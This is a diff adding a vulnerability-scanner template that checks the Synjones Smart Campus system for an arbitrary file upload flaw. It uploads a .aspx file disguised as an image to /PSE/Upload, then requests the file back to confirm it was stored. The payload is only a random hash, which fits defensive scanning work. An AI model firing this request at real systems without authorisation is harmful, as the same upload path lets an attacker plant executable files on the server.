@@ -1,0 +1,57 @@
+id: synjones-upload-anyfile-upload
+info:
+  name: Synjones Smart Campus Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Synjones Smart Campus Information Management System is vulnerable to an arbitrary file upload vulnerability, allowing attackers to upload malicious files.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/PSE/Upload"
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: |-
+      --00content0boundary00
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+      Content-Type: image/jpg
+
+      {{t2}}
+      --00content0boundary00--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"SaveName\""
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - '\"SaveName\":\"(.*?).aspx\"'
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Upload/PrimarySchoolEnrollment/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
